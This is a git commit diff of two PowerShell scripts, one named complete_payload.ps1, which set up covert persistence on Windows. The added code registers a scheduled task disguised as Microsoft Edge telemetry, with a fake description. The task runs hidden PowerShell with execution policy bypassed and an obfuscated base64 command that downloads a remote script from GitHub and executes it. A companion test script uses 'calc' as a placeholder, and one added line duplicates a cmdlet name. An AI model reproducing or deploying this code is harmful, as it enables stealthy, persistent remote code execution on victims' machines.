a64d2f881c5ac2b30a532429cf92186c80b61024
Clickest <wojtekgoska@gmail.com>
2021-01-04 15:05:29 +0100

    scheduled tasks improvement

--- complete_payload.ps1
+++ complete_payload.ps1
@@ -1,10 +1,11 @@
-if(Get-ScheduledTask -TaskName 'Office Feature Updates Helper') {
-    Unregister-ScheduledTask -TaskName 'Office Feature Updates Helper' -Confirm:$false
+if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
+    Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
 }
+$ac = New-ScheduledTaskAction New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoLogo -NonInteractive -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA'
+$st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -RunOnlyIfIdle -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -IdleDuration 00:02:00 -IdleWaitTimeout 23:00:00
+$tr = New-ScheduledTaskTrigger -Daily -At ((Get-Date).AddMinutes(5))
+$tr2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)
 
-Register-ScheduledTask 
--TaskName 'Office Feature Updates Helper' 
--TaskPath '\Micnosoft\Office\'  
--Action (New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoLogo -NonInteractive -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA') 
--Settings (New-ScheduledTaskSettingsSet -DisallowHardTerminate -AllowStartIfOnBatteries -RunOnlyIfIdle -DontStopOnIdleEnd -IdleDuration 00:02:00 -RestartInterval 00:01:00) 
--Trigger (New-ScheduledTaskTrigger -AtLogon)
+$tr.Repetition = $tr2.Repetition
+
+Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Description "This task initiates the background task for Microsoft Edge Telemetry Agent, which scans and uploads basic usage and error information for Microsoft Edge solution." -Action $ac -Settings $st -Trigger $tr
--- schedule_task.ps1
+++ schedule_task.ps1
@@ -1,16 +1,12 @@
-Register-ScheduledTask 
--TaskName 'Office Feature Updates Helper' 
--TaskPath '\Micnosoft\Office\'  
--Action (New-ScheduledTaskAction -Execute 'powershell' -Argument 'calc') 
--Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries) 
--Trigger (New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(5).ToString("MM/dd/yyyy hh:mm:ss")) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3))
+if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
+    Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
+}
+$ac = New-ScheduledTaskAction -Execute 'powershell' -Argument 'calc'
+$st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -RunOnlyIfIdle -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -IdleDuration 00:02:00 -IdleWaitTimeout 23:00:00
+$tr = New-ScheduledTaskTrigger -Daily -At ((Get-Date).AddMinutes(5))
+$tr2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)
 
-=======================================================================================
+$tr.Repetition = $tr2.Repetition
 
-Register-ScheduledTask 
--TaskName 'Office Feature Updates Helper' 
--TaskPath '\Micnosoft\Office\'  
--Action (New-ScheduledTaskAction -Execute 'calc' -Argument '') 
--Settings (New-ScheduledTaskSettingsSet -DisallowHardTerminate -AllowStartIfOnBatteries -RunOnlyIfIdle -DontStopOnIdleEnd -IdleDuration 00:02:00 -RestartInterval 00:01:00) 
--Trigger (New-ScheduledTaskTrigger -AtLogon)
+Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Description "This task initiates the background task for Microsoft Edge Telemetry Agent, which scans and uploads basic usage and error information for Microsoft Edge solution." -Action $ac -Settings $st -Trigger $tr
 
